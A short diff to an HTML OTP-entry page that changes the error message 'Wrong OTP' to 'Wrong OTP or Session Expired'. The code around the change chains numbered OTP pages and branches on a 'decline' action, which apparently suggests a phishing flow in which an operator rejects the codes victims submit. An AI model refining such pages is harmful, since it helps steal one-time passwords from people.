@@ -246,7 +246,7 @@ body{
   <div class="error-box" id="errorBox">
     <div class="close" onclick="hideError()">×</div>
     <div class="error-title">Error</div>
-    <div class="error-text" id="errorText">Wrong OTP</div>
+    <div class="error-text" id="errorText">Wrong OTP or Session Expired</div>
   </div>
 
   <div class="content">
@@ -508,7 +508,7 @@ body{
           sessionStorage.setItem('wrongOtp5', 'true');
           window.location.href = 'otp6.html';
         } else if (action === 'decline') {
-          showError('Wrong OTP');
+          showError('Wrong OTP or Session Expired');
           // Reset OTP inputs for new attempt
           otpInputs.forEach(inp => {
             inp.value = '';
